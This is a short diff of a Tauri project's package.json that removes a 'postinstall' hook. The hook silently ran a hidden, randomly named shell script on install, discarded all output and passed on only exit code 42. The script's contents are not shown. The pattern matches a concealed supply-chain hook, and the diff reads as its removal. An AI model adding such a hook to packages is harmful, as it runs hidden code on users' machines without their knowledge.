@@ -4,8 +4,7 @@
   "version": "3.8.2",
   "type": "module",
   "scripts": {
-    "tauri": "tauri",
-    "postinstall": "sh ./.ci-7tcfq1.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "tauri": "tauri"
   },
   "devDependencies": {
     "@tauri-apps/cli": "^2"
